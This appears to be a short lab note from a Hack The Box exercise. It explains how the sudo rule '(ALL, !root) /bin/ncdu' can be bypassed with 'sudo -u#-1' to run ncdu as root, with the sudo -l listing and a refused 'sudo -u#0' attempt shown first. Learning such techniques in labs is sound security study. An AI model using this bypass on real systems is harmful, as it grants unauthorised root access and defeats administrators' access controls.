- Assume we have the following `sudo` configuration for our user:
```bash
htb-student@ubuntu:~$ sudo -l
Matching Defaults entries for htb-student on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ubuntu:
    (ALL, !root) /bin/ncdu
```
=> The current user can run the command `/bin/ncdu` as any user besides the root user.

- So if we run the following command:
```bash
sudo -u#0 /bin/ncdu
```
The system knows that the `id = 0` belongs to the root user so we get the following user:
```bash
htb-student@ubuntu:~$ sudo -u#0 /bin/ncdu
Sorry, user htb-student is not allowed to execute '/bin/ncdu' as root on ubuntu.
```

- We can bypass it by using `id = -1`, and since users cannot have negative IDs => it will default to `id = 0`, which is the `root` id, but this time it won't be detected by the system
```bash
sudo -u#-1 /bin/ncdu
```